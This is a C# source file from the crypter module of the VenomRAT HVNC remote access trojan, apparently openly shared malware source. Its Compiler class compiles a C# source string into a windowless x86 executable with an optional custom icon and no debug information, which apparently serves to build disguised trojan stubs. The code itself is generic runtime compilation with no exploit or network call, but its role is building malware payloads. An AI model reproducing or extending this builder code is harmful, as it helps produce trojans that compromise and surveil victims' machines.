using System;
using System.CodeDom.Compiler;
using System.Windows.Forms;

namespace VenomRAT_HVNC.Crypter.Settings;

public class Compiler
{
    public static void CompileCSharpFile(string inputFileCs, string outputPathExe, string icon = null)
    {
        // Create a new compiler instance
        CodeDomProvider provider = CodeDomProvider.CreateProvider("C#");

        // Set the parameters for the compiler
        CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateExecutable = true;
        parameters.OutputAssembly = outputPathExe;
        parameters.CompilerOptions = "/target:winexe /platform:x86 "; ///optimize+

        if (icon != null && icon != "" && icon != String.Empty)
            parameters.CompilerOptions += " /win32icon:\"" + icon + "\"";
        else
            parameters.CompilerOptions += null;

        // Add any additional references or imports that are required
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.ReferencedAssemblies.Add("System.Core.dll");
        parameters.ReferencedAssemblies.Add("mscorlib.dll");
        parameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
        parameters.ReferencedAssemblies.Add("System.Reflection.dll");
        parameters.ReferencedAssemblies.Add("System.Security.dll");
        parameters.TreatWarningsAsErrors = false;
        parameters.IncludeDebugInformation = false;

        // Compile the code
        CompilerResults results = provider.CompileAssemblyFromSource(parameters, inputFileCs);

        // Check for any errors
        if (results.Errors.Count > 0)
        {
            string errorMessage = "Error compiling assembly:\n\n";
            foreach (CompilerError error in results.Errors)
            {
                errorMessage += error.ErrorText + error.Column + "\n";
            }

            MessageBox.Show(errorMessage, @"By amn...", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}